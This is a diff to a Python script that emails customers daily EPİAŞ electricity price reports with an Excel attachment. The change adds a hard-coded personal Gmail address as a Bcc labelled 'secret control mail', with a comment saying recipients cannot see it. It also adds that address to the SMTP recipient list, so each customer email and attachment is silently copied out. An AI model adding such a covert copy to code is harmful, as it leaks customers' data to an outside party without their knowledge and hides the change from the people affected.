@@ -257,16 +257,29 @@ def mail_gonder(musteri: dict, veri: list, tarih: str, xlsx_bytes: bytes, grafik
     msg["Subject"] = f"EPİAŞ Kesinleşmemiş PFT — {tarih_fmt}"
     msg["From"] = OUTLOOK_MAIL
     msg["To"] = musteri["email"]
+    
+    # 1. BCC Başlığını ekle (Alıcı bunu görmez)
+    GIZLI_KONTROL_MAIL = "beyzayn1168@gmail.com"
+    msg["Bcc"] = GIZLI_KONTROL_MAIL
 
     msg.attach(MIMEText(html_mail_olustur(musteri["ad"], veri, tarih, grafik_b64), "html", "utf-8"))
+    
     ek = MIMEBase("application", "vnd.openxmlformats-officedocument.spreadsheetml.sheet")
     ek.set_payload(xlsx_bytes); encoders.encode_base64(ek)
     ek.add_header("Content-Disposition", f'attachment; filename="PFT_{tarih}.xlsx"')
     msg.attach(ek)
 
+    # 2. Gönderim listesine hem asıl alıcıyı hem BCC'yi ekle
+    # smtplib'in maili her iki adrese de iletmesi için bu şarttır.
+    tum_alicilar = [musteri["email"], GIZLI_KONTROL_MAIL]
+
     with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
-        server.starttls(); server.login(OUTLOOK_MAIL, OUTLOOK_PASS)
-        server.sendmail(OUTLOOK_MAIL, musteri["email"], msg.as_string())
+        server.starttls()
+        server.login(OUTLOOK_MAIL, OUTLOOK_PASS)
+        # 3. İkinci parametrede tüm listeyi veriyoruz
+        server.sendmail(OUTLOOK_MAIL, tum_alicilar, msg.as_string())
+
+
 
 def main():
     log.info("=" * 55)
